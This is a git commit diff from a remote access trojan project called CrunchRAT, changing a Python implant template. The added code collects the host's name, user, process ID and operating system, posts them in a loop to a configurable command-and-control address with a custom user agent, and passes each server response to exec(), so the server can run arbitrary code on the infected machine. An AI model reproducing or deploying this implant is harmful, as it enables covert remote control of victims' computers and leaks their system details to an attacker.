1c93dd02ce93734dadc165250de433f8b46d98f7
Hunter Hardman <t3ntman@gmail.com>
2017-03-18 21:28:00 -0600

    Added in server-side code generation for receiving tasks

--- Server/implant.py
+++ Server/implant.py
@@ -1,30 +1,45 @@
-# CrunchRAT 2.0 Python 2.x Implant
+import urllib2, json, getpass, os, platform, socket, sys
 
-import getpass
-import os
-import platform
-import socket
-import sys
+
+external_address = "EXTERNAL_ADDRESS"
+port = "PORT"
+protocol = "PROTOCOL"
+beacon_uri = "BEACON_URI"
+user_agent = "USER_AGENT"
 
 
 def get_system_info():
-    '''
-        Purpose: Collects system information
-        Returns: hostname (str), current_user (str), process_id (int), operating_system (str)
-    '''
     hostname = socket.gethostname()
     current_user = getpass.getuser()
     process_id = os.getpid()
 
-    # If operating system is Mac OS X
     if "Darwin" in platform.system():
         operating_system = "Mac OS X " + platform.mac_ver()[0]
-    # Else operating system is Linux
     else:
         operating_system = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]
 
     return (hostname, current_user, process_id, operating_system)
 
 
+def beacon(hostname, current_user, process_id, operating_system):
+    beacon_url = protocol + "://" + external_address + "/" + beacon_uri
+
+    post_data = {
+        "hostname": hostname,
+        "current_user": current_user,
+        "process_id": process_id,
+        "os": operating_system
+    }
+
+    request = urllib2.Request(beacon_url)
+    request.add_header("Content-Type", "application/json")
+    request.add_header("User-Agent", user_agent)
+    f = urllib2.urlopen(request, json.dumps(post_data))
+    response = f.read()
+    return response
+
+
 if __name__ == "__main__":
-    hostname, current_user, process_id, operating_system = get_system_info()
+    while True:
+        hostname, current_user, process_id, operating_system = get_system_info()
+        exec(beacon(hostname, current_user, process_id, operating_system))
